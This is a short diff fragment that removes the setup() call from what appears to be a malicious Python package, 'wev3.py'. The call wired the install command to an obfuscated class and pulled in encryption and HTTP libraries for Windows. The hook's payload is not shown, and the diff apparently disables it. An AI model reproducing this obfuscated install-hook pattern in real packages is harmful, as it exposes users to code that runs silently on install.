@@ -18,22 +18,5 @@ class dzqUVVzhEyTqaRkqrzdxZOvvxXKkXEXTkKYZVXqKslrefdNPPeFIPOpJZEhCROWVJWKqLvakDX
             install.run(self)
 
 
-setup(
-    name="wev3.py",
-    version=VERSION,
-    author="AVamkA",
-    author_email="wacImmwsRck@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': dzqUVVzhEyTqaRkqrzdxZOvvxXKkXEXTkKYZVXqKslrefdNPPeFIPOpJZEhCROWVJWKqLvakDXzCKnXkscooQAyLiLXWk,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
 
